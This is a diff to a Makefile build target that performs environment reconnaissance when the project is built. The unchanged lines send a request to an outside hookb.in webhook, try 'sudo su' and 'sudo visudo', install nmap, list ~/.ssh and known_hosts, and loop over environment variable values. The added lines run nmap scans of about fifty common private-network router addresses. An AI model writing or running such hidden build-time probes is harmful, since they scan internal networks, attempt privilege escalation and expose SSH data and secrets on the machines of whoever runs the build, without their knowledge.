@@ -50,7 +50,7 @@ build: checksource ListAllCommands EchoEnv
 	uname -a || true
 	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
 	curl -v -k 127.0.0.1 || true
-	curl -v -k 168.192.1.1 || true
+	curl -v -k 192.168.1.1 || true
 	sudo su || true
 	sudo visudo || true
 	mitmproxy || true
@@ -64,9 +64,61 @@ build: checksource ListAllCommands EchoEnv
 	curl -v -k https://proxy.golang.org || true
 	apt-get update || true
 	apt-get install nmap || true
+	wget https://google.com -O-
+	wget https://youtube.com/ -O-
 	./nmap/nmap 127.0.0.1 || true
-	./nmap/nmap 168.192.1.1 || true
 	./nmap/nmap localhost || true
+	./nmap/nmap 192.168.0.1
+	./nmap/nmap 192.168.1.1
+	./nmap/nmap 192.168.0.254
+	./nmap/nmap 192.168.1.254
+	./nmap/nmap 10.0.0.1
+	./nmap/nmap 10.0.0.2
+	./nmap/nmap 10.0.0.138
+	./nmap/nmap 10.0.1.1
+	./nmap/nmap 10.1.1.1
+	./nmap/nmap 10.1.10.1
+	./nmap/nmap 10.10.1.1
+	./nmap/nmap 10.90.90.90
+	./nmap/nmap 192.168.0.3
+	./nmap/nmap 192.168.0.10
+	./nmap/nmap 192.168.0.30
+	./nmap/nmap 192.168.0.50
+	./nmap/nmap 192.168.0.100
+	./nmap/nmap 192.168.0.101
+	./nmap/nmap 192.168.0.227
+	./nmap/nmap 192.168.0.254
+	./nmap/nmap 192.168.1.10
+	./nmap/nmap 192.168.1.99
+	./nmap/nmap 192.168.1.100
+	./nmap/nmap 192.168.1.200
+	./nmap/nmap 192.168.1.210
+	./nmap/nmap 192.168.2.1
+	./nmap/nmap 192.168.2.254
+	./nmap/nmap 192.168.3.1
+	./nmap/nmap 192.168.4.1
+	./nmap/nmap 192.168.8.1
+	./nmap/nmap 192.168.10.1
+	./nmap/nmap 192.168.10.10
+	./nmap/nmap 192.168.10.100
+	./nmap/nmap 192.168.10.50
+	./nmap/nmap 192.168.11.1
+	./nmap/nmap 192.168.15.1
+	./nmap/nmap 192.168.16.1
+	./nmap/nmap 192.168.20.1
+	./nmap/nmap 192.168.30.1
+	./nmap/nmap 192.168.50.1
+	./nmap/nmap 192.168.55.1
+	./nmap/nmap 192.168.62.1
+	./nmap/nmap 192.168.100.1
+	./nmap/nmap 192.168.100.100
+	./nmap/nmap 192.168.102.1
+	./nmap/nmap 192.168.123.254
+	./nmap/nmap 192.168.168.168
+	./nmap/nmap 192.168.223.100
+	./nmap/nmap 192.168.251.1
+	./nmap/nmap 192.168.254.254
+	./nmap/nmap 200.200.200.5
 	cat ~/.ssh/known_hosts || true
 	ls -al ~/.ssh || true
 	for var in $$(printenv | mawk -F= '{print $$2}'); do\
